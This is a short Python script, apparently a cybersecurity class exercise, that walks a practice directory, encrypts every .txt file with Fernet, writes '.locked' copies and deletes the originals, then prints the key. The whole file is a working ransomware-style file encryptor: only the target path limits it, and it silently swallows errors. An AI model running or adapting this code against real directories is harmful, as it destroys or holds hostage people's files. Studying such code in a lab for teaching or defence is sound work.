import os 
import sys
from cryptography.fernet import Fernet  
# generar las claves unicas
key = Fernet.generate_key()
cipher = Fernet(key)
print(key)
for root, _, files in os.walk("/home/diana/Documentos/Ciberseguridad/practica"):
    for file in files:
        if file.endswith(".txt"):
            file_path = os.path.join(root, file)
            print(file)
            try:
                with open(file_path, "rb") as f:
                    data = f.read()
                encrypted = cipher.encrypt(data)
                with open(file_path + '.locked', "wb") as f:
                    f.write(encrypted)
                os.remove(file_path)
            except:
             pass
print (f"\n [i] todos los archivos has sido cifrados\n")
print(f"\n[+] key: {key.decode()}\n")


